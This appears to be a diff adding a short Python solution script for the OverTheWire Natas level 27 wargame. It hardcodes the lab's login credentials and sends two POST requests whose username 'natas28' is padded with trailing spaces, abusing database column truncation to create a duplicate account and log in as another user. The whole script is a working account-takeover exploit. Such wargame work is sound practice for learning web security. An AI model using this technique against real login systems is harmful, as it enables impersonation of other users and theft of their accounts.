@@ -1,0 +1,16 @@
+import requests
+
+url = "http://natas27.natas.labs.overthewire.org/"
+auth = ("natas27", "u3RRffXjysjgwFU6b9xa23i6prmUsYne")
+
+fake_username = "natas28" + " " * 57 + "A"
+r1 = requests.post(url, data={"username": fake_username, "password": ""}, auth=auth)
+
+print("Create:")
+print(r1.text)
+
+padded_username = "natas28" + " " * 57
+r2 = requests.post(url, data={"username": padded_username, "password": ""}, auth=auth)
+
+print("Login:")
+print(r2.text)
